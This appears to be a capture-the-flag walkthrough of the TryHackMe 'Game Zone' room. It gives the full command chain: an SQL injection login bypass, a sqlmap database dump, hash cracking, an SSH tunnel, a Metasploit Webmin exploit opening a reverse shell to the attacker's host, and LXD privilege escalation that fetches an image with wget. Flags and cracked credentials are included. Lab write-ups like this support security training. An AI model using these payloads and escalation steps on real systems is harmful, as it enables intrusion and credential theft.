@@ -1,0 +1,213 @@
+nmap -sSVC -Pn -vv $IP
+gobuster dir --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.79.57/ -x php,txt,html,sh,cgi,bak -q
+
+#Task 2  Obtain access via SQLi
+SQL is a standard language for storing, editing and retrieving data in databases. A query can look like so:
+SELECT * FROM users WHERE username = :username AND password := password
+In our GameZone machine, when you attempt to login, it will take your inputted values from your username and password, then insert them directly into the query above. If the query finds data, you'll be allowed to login otherwise it will display an error message.
+Here is a potential place of vulnerability, as you can input your username as another SQL query. This will take the query write, place and execute it.
+No answer
+
+Lets use what we've learnt above, to manipulate the query and login without any legitimate credentials.
+If we have our username as admin and our password as: ' or 1=1 -- - it will insert this into the query and authenticate our session.
+The SQL query that now gets executed on the web server is as follows:
+SELECT * FROM users WHERE username = admin AND password := ' or 1=1 -- -
+The extra SQL we inputted as our password has changed the above query to break the initial query and proceed (with the admin user) if 1==1, then comment the rest of the query to stop it breaking.
+no answer
+
+
+Use ' or 1=1 -- - as your username and leave the password blank.
+When you've logged in, what page do you get redirected to?
+/portal.php
+
+#Task 3  Using SQLMap
+Open Burp Suite ---> 
+open 'or 1=1 -- - http://10.10.207.19/index.php
+-->http://10.10.207.19/portal.php
+
+--> Burp 
+POST /portal.php HTTP/1.1
+Host: 10.10.207.19
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.207.19/portal.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+Origin: http://10.10.207.19
+Connection: close
+Cookie: PHPSESSID=7r8evbin8k10mujnnhu8b13rg2
+Upgrade-Insecure-Requests: 1
+DNT: 1
+Sec-GPC: 1
+
+searchitem=test
+
+---> save request.txt
+
+sqlmap -r request.txt --dbms=mysql --dump
+
+- In the users table, what is the hashed password?
+hint:
+cat /tmp/sqlmapsunly_c74159/sqlmaphashes-b3f1lbym.txt
+agent47:ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
+ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
+
+
+- What was the username associated with the hashed password?
+agent47
+
+- What was the other table name?
+post
+
+
+#Task 4  Cracking a password with JohnTheRipper
+- What is the de-hashed password?
+hint: john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
+videogamer124
+
+or
+https://crackstation.net/
+paste: ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
+videogamer124
+
+
+- What is the user flag?
+ssh agent47@10.10.79.57
+agent47@gamezone:~$ ls
+user.txt
+agent47@gamezone:~$ cat user.txt
+649ac17b1480ac13ef1e4fa579dac95c
+
+#Task 5  Exposing services with reverse SSH tunnels
+- What is the name of the exposed CMS?
+hint: 
+agent47@gamezone:~$ ss -tulpn
+Netid  State      Recv-Q Send-Q            Local Address:Port                           Peer Address:Port
+udp    UNCONN     0      0                             *:68                                        *:*
+udp    UNCONN     0      0                             *:10000                                     *:*
+tcp    LISTEN     0      128                           *:22                                        *:*
+tcp    LISTEN     0      80                    127.0.0.1:3306                                      *:*
+tcp    LISTEN     0      128                           *:10000                                     *:*
+tcp    LISTEN     0      128                          :::22                                       :::*
+tcp    LISTEN     0      128                          :::80                                       :::*
+
+SSH Tunnel
+
+ssh -L 10000:localhost:10000 agent47@10.10.79.57
+
+on my machine: http://localhost:10000
+webmin
+
+
+- What is the CMS version?
+hint: login on http://localhost:10000 with agent47:videogamer124
+version 1.580
+1.580
+
+#Task 6  Privilege Escalation with Metasploit
+searchsploit webmin 1.580
+searchsploit webmin 1.580           
+------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                             |  Path
+------------------------------------------------------------------------------------------- ---------------------------------
+Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)                      | unix/remote/21851.rb
+Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                              | linux/webapps/47330.rb
+------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+
+msfconsole>
+msf6>search webmin
+msf6 > search webmin
+
+Matching Modules
+================
+
+   #  Name                                         Disclosure Date  Rank       Check  Description
+   -  ----                                         ---------------  ----       -----  -----------
+   0  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
+   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure
+   2  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
+   3  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
+   4  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
+   5  exploit/linux/http/webmin_backdoor           2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
+
+
+Interact with a module by name or index. For example info 5, use 5 or use exploit/linux/http/webmin_backdoor
+
+msf6 > use  exploit/unix/webapp/webmin_show_cgi_exec
+msf6>show options
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set username agent47
+username => agent47
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set password videogamer124
+password => videogamer124
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set payload cmd/unix/reverse_python
+payload => cmd/unix/reverse_python
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set rhosts 127.0.0.1
+rhosts => 127.0.0.1
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set lhost 10.6.88.227
+lhost => 10.6.88.227
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set lport 443
+lport => 443
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set ssl false
+[!] Changing the SSL option's value may require changing RPORT!
+ssl => false
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > exploit
+[*] Started reverse TCP handler on 10.6.88.227:443
+[*] Attempting to login...
+[+] Authentication successful
+[+] Authentication successful
+[*] Attempting to execute the payload...
+[+] Payload executed successfully
+[*] Command shell session 1 opened (10.6.88.227:443 -> 10.10.79.57:54714) at 2021-08-03 12:10:10 +0700
+
+whoami
+root
+shell
+cat /root/root.txt
+a4b945830144bdd71908d12d902adeee
+
+- What is the root flag?
+a4b945830144bdd71908d12d902adeee
+
+OR other Privilege
+/tmp/./LinEnum.sh
+[+] We're a member of the (lxd) group - could possibly misuse these rights!
+uid=1000(agent47) gid=1000(agent47) groups=1000(agent47),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+
+./linpeas.sh
+OS: Linux version 4.4.0-159-generic (buildd@lgw01-amd64-042) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.10) ) #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019
+User & Groups: uid=1000(agent47) gid=1000(agent47) groups=1000(agent47),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+
+
+on my machine
+git clone https://github.com/saghul/lxd-alpine-builder.git
+cd lxd-alpine-builder
+apt install anbox
+sudo ./build-alpine
+python3 -m http.server
+
+on target
+wget http://myip:8000/alpine-v3.3-x86_64-20160114_2308.tar.gz
+lxc image import alpine-v3.3-x86_64-20160114_2308.tar.gz --alias alpine-v3.3
+
+lxc   init myimage ignite -c   security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ignite
+lxc exec ignite /bin/sh
+#whoami
+root
+#cd /mnt/root/root
+cat root.txt
+a4b945830144bdd71908d12d902adeee
+
+
+https://www.pwndefend.com/2020/02/03/try-hack-me-part-5-game-zone/
+https://bryanwendt.wordpress.com/2020/12/01/tryhackme-gamezone-walkthrough/
+https://steflan-security.com/tryhackme-game-zone-walkthrough/
+https://www.aldeid.com/wiki/TryHackMe-Game-Zone
+https://medium.com/@CyberOPS.LittleDog/tryhackme-game-zone-864ad2ad93f8
+https://ratiros01.medium.com/tryhackme-game-zone-b41874804d4e
+https://infosecwriteups.com/tryhackme-game-zone-ctf-writeup-detailed-308396d81f7c
